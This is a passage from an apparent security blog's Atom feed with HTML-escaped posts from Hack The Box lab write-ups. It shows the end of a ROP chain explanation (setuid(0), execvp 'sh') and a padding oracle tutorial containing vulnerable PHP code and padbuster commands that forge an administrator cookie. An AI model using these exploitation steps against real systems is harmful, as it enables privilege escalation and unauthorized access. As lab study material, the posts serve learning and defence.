pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret

&lt;span class=&quot;c&quot;&gt;# When &quot;pop rdi&quot; instruction executes, it will put &quot;sh&quot; into&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# RDI since this is the next value in the stack.&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Continuing from previous stack frame, the next instruction&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# to execute is &quot;pop rdi; ret&quot;. In this case our target&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# function call is `execvp()`. It accepts 2 parameters:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#  1. the string we want to execute in this case its&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#     `/bin/sh` or just &quot;sh&quot;. This should be put to RDI.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#  2. a NULL terminator and must be put to RSI.&lt;/span&gt;
pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret

&lt;span class=&quot;c&quot;&gt;## lower memory address ##&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is also an illustration of stack flow of stack frame 1. Flow for stack frame 2 will be similar.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## stack view @ RIP &quot;pop_rdi_addr&quot;&lt;/span&gt;
setuid_addr
null
pop_rdi_addr    &lt;span class=&quot;c&quot;&gt;# --&amp;gt; flow executions continues @ this addr&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;## stack view @ pop rdi&lt;/span&gt;
setuid_addr
null            &lt;span class=&quot;c&quot;&gt;# --&amp;gt; POP to RDI&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;## stack view @ ret&lt;/span&gt;
setuid_addr     &lt;span class=&quot;c&quot;&gt;# --&amp;gt; executes `setuid(0)`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;HTB RedCross&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Padding Oracle Attack</title>
   <link href="https://mvineza.github.io/spindel/2021/12/25/padding-oracle-attack"/>
   <updated>2021-12-25T00:00:00+08:00</updated>
   <id>https://mvineza.github.io/2021/12/25/Padding-Oracle-Attack</id>
   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;CBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/spindel/assets/Padding Oracle Attack/padding.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).&lt;/p&gt;

&lt;p&gt;This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// example file from HTB lazy&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encryptedText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encryptedText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;mcrypt_get_iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MCRYPT_DES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mcrypt_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MCRYPT_DES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pkcs5_unpad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Invalid padding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// really? you want to be hacked?&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;// maybe let's replace that or&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// remove entirely?&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is also a type of CCA or Chosen Ciphertext Attack.&lt;/p&gt;

&lt;h2 id=&quot;details-on-ciphertext-manipulation&quot;&gt;Details on ciphertext manipulation&lt;/h2&gt;
&lt;p&gt;Go to “The Theory” part of this &lt;a href=&quot;https://pentesterlab.com/exercises/padding_oracle/course&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;detection&quot;&gt;Detection&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Try manipulating cookie values. See if webapp will error response such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invalid padding&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;500&lt;/code&gt;,&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Using padbuster&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# installation&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;padbuster

&lt;span class=&quot;c&quot;&gt;# detection&lt;/span&gt;
padbuster http://10.10.10.10/index.php &lt;span class=&quot;s2&quot;&gt;&quot;RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt; 8 &lt;span class=&quot;nt&quot;&gt;-encoding&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-cookies&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;login=RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# gets an admin cookie&lt;/span&gt;
padbuster http://10.10.10.10/index.php &lt;span class=&quot;s2&quot;&gt;&quot;RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt; 8 &lt;span class=&quot;nt&quot;&gt;-encoding&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-cookies&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;login=RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-plaintext&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user=administrator&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Using &lt;a href=&quot;https://0xdf.gitlab.io/2020/07/29/htb-lazy.html#path-2-bit-flip-attack&quot;&gt;bit flippingattack&lt;/a&gt;. Here is another resource from &lt;a href=&quot;https://www.youtube.com/watch?v=3VxZNflJqsw&amp;amp;t=460s&quot;&gt;ippsec&lt;/a&gt; using Burp.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/cryptography/padding-oracle-priv#padding-oracle&quot;&gt;Padding Oracle - HackTricks&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=3VxZNflJqsw&quot;&gt;HTB Lazy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=aH4DENMN_O4&amp;amp;t=873s&quot;&gt;Mathematical Explanation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://robertheaton.com/2013/07/29/padding-oracle-attack/&quot;&gt;The Padding Oracle Attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 

</feed>
